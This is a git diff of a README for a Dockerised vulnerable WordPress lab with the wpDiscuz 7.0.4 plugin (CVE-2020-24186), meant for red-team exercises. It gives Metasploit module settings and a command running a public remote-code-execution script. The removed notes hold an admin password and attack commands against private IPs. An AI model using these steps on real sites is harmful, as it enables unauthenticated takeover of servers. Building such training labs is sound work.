@@ -1,49 +1,49 @@
-admin / 3HfEXeyksooMNp2LGI
+# WordPress Lab
 
-curl http://172.25.0.3/wp-content/plugins/wpdiscuz/readme.txt | head -n 10
-
-search CVE-2020-24186
-use 0
-
-set RHOSTS 172.25.0.3
-
-set BLOGPATH /index.php/2025/01/20/fake-post-2/
-
-set LHOST 172.25.0.4
+This is a WordPress Lab version 5.2.7 with a plugin vulnerables named WPdiscuz version 7.0.4 with al well know vulnerability CVE-2020-24186. The idea of this repo is to have created a web vulnerable used in Red Team labs or cyberexercises.
 
 
 
-echo "http://172.25.0.3/" > site.txt
+## Deploy web with Docker 
+
+`docker-compose up`
 
 
-http://localhost:8080/2025/01/20/fake-post-2/#comment-4
+## It is vulnerable? 
+
+```curl http:/localhost:8080/wp-content/plugins/wpdiscuz/readme.txt | head -n 10```
+
+Check de wpdiscuzz version
 
 
+## Option A - with Metasploit
+
+Web Post as sample: http://localhost:8080/2025/01/20/fake2/
 
 
-Opción A
-curl http://192.168.1.175:8080/wp-content/plugins/wpdiscuz/readme.txt | head -n 10
-
-http://localhost:8080/2025/01/20/fake2/
-
-msfconsole 
+```
+$ msfconsole 
 
 search CVE-2020-24186
 use 0
 
 
-set RHOSTS 192.168.1.175
-set RPORT 8080
+set RHOSTS <IP HOST>
+set RPORT 8080 # or a different port
 
 set BLOGPATH /2025/01/20/fake2/
 
-set LHOST 192.168.1.175
+set LHOST  <IP Localhost HOST>
+
+```
 
 
-Opción B
+## Option B - Using a python script
 
-https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/tree/main
+We will be using this (script)[https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/tree/main]
 
-Opción C
-Burp Suite 
+`python wpDiscuz_RemoteCodeExec.py -u http://<IP HOST>:8080/ -p /2025/01/20/fake2/`
+
+## Option C - Burp Suite 
+
 https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce
